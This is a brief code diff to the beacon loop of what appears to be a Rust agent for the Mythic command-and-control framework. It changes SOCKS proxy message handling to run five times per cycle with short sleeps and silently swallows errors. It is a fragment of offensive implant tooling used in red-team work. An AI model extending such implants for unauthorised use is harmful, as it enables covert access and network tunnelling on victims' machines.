@@ -145,9 +145,13 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
         // Get the completed task information
         let completed_tasks = agent.tasking.get_completed_tasks()?;
 
-        // Process SOCKS messages before sending response (to include any SOCKS responses)
-        if let Err(_e) = crate::socks::process_socks_messages_sync() {
-            // SOCKS processing error - continue silently
+        // Process SOCKS messages multiple times for better responsiveness
+        for _ in 0..5 {
+            if let Err(_e) = crate::socks::process_socks_messages_sync() {
+                // SOCKS processing error - continue silently
+            }
+            // Small delay between SOCKS processing cycles
+            std::thread::sleep(std::time::Duration::from_millis(10));
         }
 
         // Send the completed tasking information up to Mythic
